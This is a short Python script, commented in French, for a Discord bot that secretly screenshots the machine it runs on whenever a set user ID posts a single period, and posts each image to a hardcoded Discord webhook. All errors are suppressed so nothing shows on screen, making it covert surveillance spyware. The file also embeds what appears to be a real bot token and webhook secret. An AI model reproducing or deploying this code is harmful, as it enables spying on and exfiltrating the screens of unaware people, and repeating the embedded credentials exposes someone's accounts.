import discord
from discord.ext import commands
from PIL import ImageGrab
import requests
import io

# Configuration
TOKEN = "MTMzMTM3OTE2OTgyMDY3MjA5Mg.GSFZEE.j8ywMhQ67DqQCiIKrsRe_20jTdhu6VA0ekYQwg"  # Remplace par le token de ton bot
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1331684413326626857/h2BSgNa9gpXsUFJKs2IHH0kHp1G1jKLjHsqZROTG1p4-iSPVuthuWEl2qmRE2GuV772J"
USER_ID = 809851781668012042  # Ton ID Discord pour vérifier qui envoie le message
GUILD_ID = 1331684327058182198  # ID du serveur Discord
KEYWORD = "."  # Mot-clé déclencheur

# Bot configuration
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

def capture_screen():
    """Capture l'écran actuel et retourne l'image en tant que fichier binaire."""
    try:
        screenshot = ImageGrab.grab()
        image_bytes = io.BytesIO()
        screenshot.save(image_bytes, format="JPEG")
        image_bytes.seek(0)
        return image_bytes
    except Exception:
        return None

def send_to_webhook(image_bytes):
    """Envoie l'image capturée au webhook Discord."""
    try:
        files = {"file": ("screenshot.jpg", image_bytes, "image/jpeg")}
        payload = {"content": "et hop!"}
        response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
        if response.status_code != 204:
            pass  # Ne rien faire si l'envoi échoue
    except Exception:
        pass

@bot.event
async def on_ready():
    pass  # Rien à faire lors de la connexion du bot

@bot.event
async def on_message(message):
    try:
        if message.author.id == USER_ID and message.content.strip() == KEYWORD:
            image_bytes = capture_screen()
            if image_bytes:
                send_to_webhook(image_bytes)
        await bot.process_commands(message)  # Permet de gérer d'autres commandes si nécessaires
    except Exception:
        pass  # Ignore les erreurs sans rien afficher

# Lancement du bot
if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except Exception:
        pass  # Ignore les erreurs lors du lancement
